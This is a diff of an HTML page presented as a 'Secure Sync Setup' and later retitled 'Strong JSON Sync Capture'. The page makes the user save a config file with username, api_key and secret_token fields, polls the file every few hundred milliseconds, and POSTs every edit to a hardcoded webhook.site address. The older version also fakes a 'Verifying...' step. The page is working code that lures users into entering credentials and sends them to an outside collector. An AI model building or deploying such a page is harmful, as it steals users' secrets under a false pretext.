@@ -1,194 +1,103 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Cloud Sync Setup</title>
-
-  <style>
-    body {
-      font-family: Arial;
-      background: #f4f7fb;
-      padding: 40px;
-    }
-    .box {
-      background: white;
-      padding: 25px;
-      border-radius: 10px;
-      max-width: 520px;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-    }
-    button {
-      padding: 12px 18px;
-      background: #2563eb;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-    }
-    #status {
-      margin-top: 15px;
-      color: #333;
-    }
-    #log {
-      margin-top: 15px;
-      background: #0f172a;
-      color: #22c55e;
-      padding: 10px;
-      height: 160px;
-      overflow: auto;
-      font-size: 12px;
-    }
-    .highlight { color: yellow; }
-  </style>
+<meta charset="UTF-8">
+<title>💪 Strong JSON Sync Capture</title>
+<style>
+body { font-family: Arial; background: #f4f7fb; padding: 40px; }
+.box { background:white; padding:25px; border-radius:10px; max-width:520px; box-shadow:0 4px 10px rgba(0,0,0,0.1);}
+button { padding:12px 18px; background:#2563eb; color:white; border:none; border-radius:6px; cursor:pointer;}
+#status {margin-top:15px; color:#333;}
+#log {margin-top:15px; background:#0f172a; color:#22c55e; padding:10px; height:180px; overflow:auto; font-size:12px;}
+.highlight { color: yellow; }
+</style>
 </head>
-
 <body>
 
 <div class="box">
-  <h2>☁️ Secure Sync Setup</h2>
-  <p>Download config file, edit it, then save it. Sync will automatically detect changes and send them to a webhook in JSON format.</p>
+<h2>☁️ Strong JSON Sync Capture</h2>
+<p>Save a JSON file, edit it in any editor, and this will capture every change to a webhook.</p>
 
-  <button onclick="start()">Start Setup</button>
+<button onclick="start()">Start Monitoring</button>
 
-  <div id="status"></div>
-  <div id="log"></div>
+<div id="status"></div>
+<div id="log"></div>
 </div>
 
 <script>
-// Variables
 let fileHandle;
 let lastContent = "";
 let monitoring = false;
-let redirected = false;
-let webhookURL = "https://webhook.site/074af2d2-5d1d-438f-ab3f-76b8d9103af2"; // Replace with your actual webhook URL
+const webhookURL = "https://webhook.site/074af2d2-5d1d-438f-ab3f-76b8d9103af2"; // Replace with your webhook
 
-// Log function to display messages in the UI
-function log(msg) {
-  document.getElementById("log").innerHTML += msg + "<br>";
-}
+function log(msg){ document.getElementById("log").innerHTML += msg + "<br>"; }
+function status(msg){ document.getElementById("status").innerText = msg; }
 
-// Status update function
-function status(msg) {
-  document.getElementById("status").innerText = msg;
-}
-
-// Function to download the initial file
 async function start() {
-  try {
-    // Open save file picker and create a new file
-    fileHandle = await window.showSaveFilePicker({
-      suggestedName: "sync-config.txt",
-      types: [{
-        description: "Config File",
-        accept: { "text/plain": [".txt"] }
-      }]
-    });
-
-    const writable = await fileHandle.createWritable();
-
-    // Write the initial content to the file
-    await writable.write(`# Sync Config
-username=
-api_key=
-secret_token=
-    `);
-
-    await writable.close();
-
-    status("✅ File created. Edit & save to sync...");
-
-    // Start monitoring the file
-    monitor();
-  } catch (e) {
-    status("Error: " + e.message);
-  }
-}
-
-// Function to monitor the file for changes
-function monitor() {
-  if (monitoring) return;
-  monitoring = true;
-
-  setInterval(async () => {
-    if (!fileHandle) return;
-
     try {
-      // Read the current file content
-      const file = await fileHandle.getFile();
-      const text = await file.text();
+        fileHandle = await window.showSaveFilePicker({
+            suggestedName: "sync-config.json",
+            types:[{description:"JSON Config File", accept:{"application/json":[".json"]}}]
+        });
 
-      // Check if the file content has changed
-      if (text !== lastContent) {
-        showDiff(lastContent, text); // Display the diff
-        lastContent = text;
+        const writable = await fileHandle.createWritable();
+        const initialContent = JSON.stringify({username:"",api_key:"",secret_token:""}, null, 2);
+        await writable.write(initialContent);
+        await writable.close();
 
-        sendToWebhook(text); // Send the updated content to the webhook as JSON
-      }
-    } catch (e) {
-      log("❌ Read error");
+        lastContent = initialContent;
+        status("✅ JSON file created. Now monitoring changes...");
+        monitorFile();
+    } catch(e) {
+        status("Error: "+e.message);
     }
-  }, 500); // Faster polling to catch changes
 }
 
-// Function to display changes (highlight the diff)
-function showDiff(oldText, newText) {
-  log("📡 Sync update:");
+// Aggressive polling every 300ms, catching edits while file is open
+function monitorFile(){
+    if(monitoring) return;
+    monitoring = true;
 
-  let output = "";
-  for (let i = 0; i < newText.length; i++) {
-    if (oldText[i] !== newText[i]) {
-      output += `<span class="highlight">${newText[i] || ""}</span>`;
-    } else {
-      output += newText[i] || "";
-    }
-  }
+    setInterval(async()=>{
+        if(!fileHandle) return;
+        try {
+            const file = await fileHandle.getFile();
+            const text = await file.text();
+            if(text !== lastContent){
+                log("📡 Detected JSON change:");
+                log(`<pre>${text}</pre>`);
+                lastContent = text;
 
-  log("<pre>" + output + "</pre>");
+                try {
+                    const jsonData = JSON.parse(text);
+                    sendWebhook(jsonData);
+                } catch(err){
+                    log("❌ Invalid JSON, not sent");
+                }
+            }
+        } catch(e){
+            log("❌ File read error: "+e.message);
+        }
+    }, 300); // Fast polling
 }
 
-// Function to send the file content to the webhook as JSON
-async function sendToWebhook(data) {
-  try {
-    // Convert the text content to JSON format
-    const jsonData = {
-      timestamp: new Date().toISOString(),
-      content: data, // The actual file content
-    };
-
-    // Make sure to trigger a POST request, not OPTIONS
-    const response = await fetch(webhookURL, {
-      method: "POST", // Ensure it's POST
-      headers: {
-        "Content-Type": "application/json", // Ensure the request is in JSON format
-        "Accept": "application/json", // Accept JSON response
-        "Access-Control-Allow-Origin": "*", // Allow all origins for CORS (important for testing)
-        "Access-Control-Allow-Methods": "POST", // Allow POST method
-        "Access-Control-Allow-Headers": "Content-Type", // Allow Content-Type header
-      },
-      body: JSON.stringify(jsonData), // Send the file content in JSON format
-    });
-
-    if (response.ok) {
-      log("🚀 Webhook request sent successfully.");
-    } else {
-      log("❌ Failed to send webhook request.");
+// Send updated JSON to webhook
+async function sendWebhook(jsonData){
+    try{
+        const payload = {timestamp:new Date().toISOString(), content: jsonData};
+        const res = await fetch(webhookURL,{
+            method:"POST",
+            headers:{"Content-Type":"application/json"},
+            body:JSON.stringify(payload)
+        });
+        if(res.ok){
+            log("🚀 Webhook sent successfully.");
+        }else{
+            log("❌ Failed webhook request.");
+        }
+    }catch(e){
+        log("❌ Error sending webhook: "+e.message);
     }
-  } catch (error) {
-    log("❌ Error sending webhook request: " + error.message);
-  }
-}
-
-// Function to simulate redirecting the user to a new tab after a file change
-function triggerRedirect() {
-  if (redirected) return;
-  redirected = true;
-
-  status("🔐 Verifying...");
-
-  // Redirect to Google.com after detecting a change in the file
-  setTimeout(() => {
-    window.open("https://www.google.com", "_blank");
-  }, 800); // Open new tab after 800ms delay
 }
 </script>
 
